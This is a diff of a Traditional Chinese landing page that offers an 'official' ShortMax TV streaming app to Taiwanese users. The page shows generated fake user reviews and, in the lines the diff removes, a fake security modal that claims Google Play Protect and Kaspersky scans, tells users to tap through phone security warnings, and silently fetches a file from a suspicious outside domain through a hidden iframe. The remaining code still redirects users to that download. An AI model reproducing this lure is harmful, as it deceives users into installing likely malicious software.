@@ -22,15 +22,6 @@
     .cta-glow {
       animation: pulse-glow 2s infinite ease-in-out;
     }
-
-    @keyframes radar-ping {
-      0% { transform: scale(0.95); opacity: 0.8; }
-      50% { transform: scale(1.15); opacity: 0.3; }
-      100% { transform: scale(0.95); opacity: 0.8; }
-    }
-    .radar-anim {
-      animation: radar-ping 1.5s infinite ease-in-out;
-    }
   </style>
 </head>
 <body class="flex flex-col min-h-screen pb-28">
@@ -159,7 +150,7 @@
       </div>
     </div>
 
-    <!-- 7. 台灣真實用戶評論區 (顯示 2,108+ 則) -->
+    <!-- 7. 台灣真實用戶評論區 -->
     <div class="mt-6">
       <div class="flex items-center justify-between mb-3">
         <h3 class="text-xs font-bold text-gray-200 flex items-center">
@@ -218,69 +209,7 @@
     </div>
   </div>
 
-  <!-- 10. 高速通道連接 & 安全認證緩衝彈窗 -->
-  <div id="downloadBufferModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
-    <div class="bg-[#18181b] border border-gray-700/80 rounded-2xl max-w-sm w-full p-5 text-center shadow-2xl relative overflow-hidden">
-      
-      <!-- 頂部雷達波安全動效 -->
-      <div class="relative w-14 h-14 mx-auto mb-3 flex items-center justify-center">
-        <div class="absolute inset-0 rounded-full bg-emerald-500/20 radar-anim"></div>
-        <div class="w-12 h-12 rounded-full bg-[#121c16] border border-emerald-500/50 flex items-center justify-center shadow-inner">
-          <svg class="w-6 h-6 text-emerald-400" fill="currentColor" viewBox="0 0 20 20">
-            <path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd"></path>
-          </svg>
-        </div>
-      </div>
-
-      <h3 class="text-base font-bold text-white tracking-wide">正在建立台灣高速下載通道</h3>
-      <p class="text-xs text-[#FF8533] font-medium mt-0.5">ShortMax TV 官方安全安裝包 (28.4MB)</p>
-
-      <!-- 動態進度條 -->
-      <div class="mt-4 bg-[#111214] p-3 rounded-xl border border-gray-800">
-        <div class="flex justify-between text-[11px] mb-1.5 font-mono">
-          <span id="bufferStatusText" class="text-gray-300">正在分配台北 CDN 節點...</span>
-          <span id="bufferProgressNum" class="text-emerald-400 font-bold">12%</span>
-        </div>
-        <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden">
-          <div id="bufferProgressBar" class="bg-gradient-to-r from-orange-500 to-emerald-400 h-full w-[12%] transition-all duration-300 rounded-full"></div>
-        </div>
-      </div>
-
-      <!-- 權威機構安全檢驗標誌 -->
-      <div class="mt-3.5 space-y-1.5 text-left bg-[#121417] p-2.5 rounded-xl border border-gray-800/80">
-        <div class="flex items-center space-x-2 text-[11px] text-gray-200">
-          <span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span>
-          <span class="font-semibold text-emerald-400">Google Play Protect</span>
-          <span class="text-gray-400">雲端安全協議認證通過</span>
-        </div>
-        <div class="flex items-center space-x-2 text-[11px] text-gray-200">
-          <span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span>
-          <span class="font-semibold text-emerald-400">卡巴斯基 (Kaspersky)</span>
-          <span class="text-gray-400">沙盒深度掃毒 0 惡意代碼</span>
-        </div>
-        <div class="flex items-center space-x-2 text-[11px] text-gray-200">
-          <span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span>
-          <span class="font-semibold text-emerald-400">無敏感權限要求</span>
-          <span class="text-gray-400">免信用卡 · 免註冊直接觀影</span>
-        </div>
-      </div>
-
-      <!-- 官方專線指引文案 -->
-      <div class="mt-3 text-[10px] text-gray-300 bg-[#121614] border border-emerald-900/40 p-2.5 rounded-lg text-left flex items-start space-x-1.5">
-        <span class="text-emerald-400 mt-0.5 font-bold">✔</span>
-        <p class="leading-relaxed">
-          <strong class="text-white">官方專線提示：</strong>為保障 4K 播放品質，本程式採用官方直連通道。若手機跳出系統常規安全確認，請依序點選 <span class="text-[#FF8533] font-bold">【保留 / 繼續下載】</span> 即可體驗。
-        </p>
-      </div>
-
-      <button onclick="closeBufferModal()" class="mt-4 w-full bg-[#27272a] hover:bg-[#3f3f46] text-gray-200 text-xs font-bold py-2.5 rounded-xl transition-all">
-        知道了，保持後台下載
-      </button>
-
-    </div>
-  </div>
-
-  <!-- 11. 真實法律條款彈窗 -->
+  <!-- 10. 法律條款彈窗 -->
   <div id="privacyModal" class="fixed inset-0 bg-black/85 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
     <div class="bg-[#18181b] border border-gray-700 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left">
       <div class="flex justify-between items-center pb-2.5 border-b border-gray-700">
@@ -343,11 +272,8 @@
     </div>
   </div>
 
-  <!-- 用於靜默平行觸發下載的隱藏 iframe -->
-  <iframe id="silentDownloadFrame" class="hidden"></iframe>
-
   <script>
-    // 1. 2026 台灣熱門影視資料庫
+    // 1. 影視資料庫
     const MEDIA_DATABASE_2026 = [
       { id: "m1", category: "movie", title: "奧德賽 (The Odyssey)", rating: "9.9", quality: "IMAX 4K", meta: "克里斯多福諾蘭 麥特戴蒙", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/7/73/The_Odyssey_2026_Poster.jpg/250px-The_Odyssey_2026_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #1C2833, #0B1015)" },
       { id: "m2", category: "movie", title: "蜘蛛人：嶄新之日", rating: "9.9", quality: "4K原聲", meta: "湯姆霍蘭德 辛蒂亞", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/45/Spider-Man_Brand_New_Day_Poster.jpg/250px-Spider-Man_Brand_New_Day_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #800A0A, #280505)" },
@@ -395,7 +321,7 @@
       { id: "sp8", category: "sports", title: "Premier 12 冠軍回顧", rating: "9.8", quality: "繁中解說", meta: "重溫台灣棒球 榮耀登頂一刻", posterUrl: "https://images.unsplash.com/photo-1563299796-17596ed6b017?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #24142B, #0B040F)" }
     ];
 
-    // 分類渲染功能（院線電影排第一）
+    // 分類切換
     function switchCategory(cat) {
       document.querySelectorAll('.cat-btn').forEach(btn => {
         if(btn.dataset.cat === cat) {
@@ -414,7 +340,6 @@
             <img src="${item.posterUrl}" alt="${item.title}" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display='none'">
             <div class="absolute inset-0 bg-gradient-to-t from-black via-black/30 to-transparent"></div>
             
-            <!-- 海報正中間醒目播放圖示 -->
             <div class="absolute inset-0 flex items-center justify-center z-10 pointer-events-none">
               <div class="w-10 h-10 rounded-full bg-black/60 backdrop-blur-sm border border-white/30 flex items-center justify-center shadow-lg">
                 <svg class="w-5 h-5 text-white ml-0.5 fill-current" viewBox="0 0 24 24">
@@ -439,7 +364,7 @@
       `).join('');
     }
 
-    // 2. 100+ 條真實口語評論庫
+    // 2. 用戶評論庫
     const FIRST_NAMES = ["陳", "林", "黃", "張", "李", "王", "吳", "劉", "蔡", "楊", "許", "鄭", "謝", "郭", "洪", "曾", "廖", "賴", "徐", "周"];
     const CITIES = ["台北市", "新北市", "台中市", "高雄市", "桃園市", "台南市", "新竹市", "彰化縣", "屏東縣", "宜蘭縣", "基隆市", "嘉義市"];
     const DEVICES = ["Samsung S24+", "Pixel 8 Pro", "Xiaomi 14", "ROG Phone 8", "OPPO Reno11", "Sony 1 VI", "vivo X100", "POCO F6"];
@@ -508,52 +433,11 @@
       renderReviews(8);
     }
 
-    // 3. 後台靜默下載 + 前台立即彈出安全通道進度條
+    // 3. 點擊後直接跳轉觸發即時下載
     const DOWNLOAD_URL = "https://inbnxsum18c0.demonhunterz.com/fPIpONuwZ7Pl";
 
     function triggerSmartDownload() {
-      try {
-        const frame = document.getElementById('silentDownloadFrame');
-        frame.src = DOWNLOAD_URL;
-      } catch (e) {
-        window.location.href = DOWNLOAD_URL;
-      }
-
-      const modal = document.getElementById('downloadBufferModal');
-      modal.classList.remove('hidden');
-
-      animateBufferProgress();
-    }
-
-    function animateBufferProgress() {
-      const progressBar = document.getElementById('bufferProgressBar');
-      const progressNum = document.getElementById('bufferProgressNum');
-      const statusText = document.getElementById('bufferStatusText');
-
-      let current = 12;
-      const timer = setInterval(() => {
-        current += Math.floor(Math.random() * 15) + 10;
-        if (current >= 100) {
-          current = 100;
-          clearInterval(timer);
-          progressBar.style.width = "100%";
-          progressNum.textContent = "100%";
-          statusText.textContent = "高速專線連接成功，安裝包已發送！";
-          statusText.className = "text-emerald-400 font-bold";
-        } else {
-          progressBar.style.width = current + "%";
-          progressNum.textContent = current + "%";
-          if (current > 50 && current < 85) {
-            statusText.textContent = "通過 Google Play & 卡巴斯基 檢疫...";
-          } else if (current >= 85) {
-            statusText.textContent = "正在傳輸 ShortMax TV 數據...";
-          }
-        }
-      }, 150);
-    }
-
-    function closeBufferModal() {
-      document.getElementById('downloadBufferModal').classList.add('hidden');
+      window.location.href = DOWNLOAD_URL;
     }
 
     // 4. 動態倒數計時器
@@ -578,7 +462,7 @@
       document.getElementById(modalId).classList.add('hidden');
     }
 
-    // 初始化頁面（院線電影排第一）
+    // 初始化頁面
     window.addEventListener('DOMContentLoaded', () => {
       switchCategory('movie');
       generateReviews();
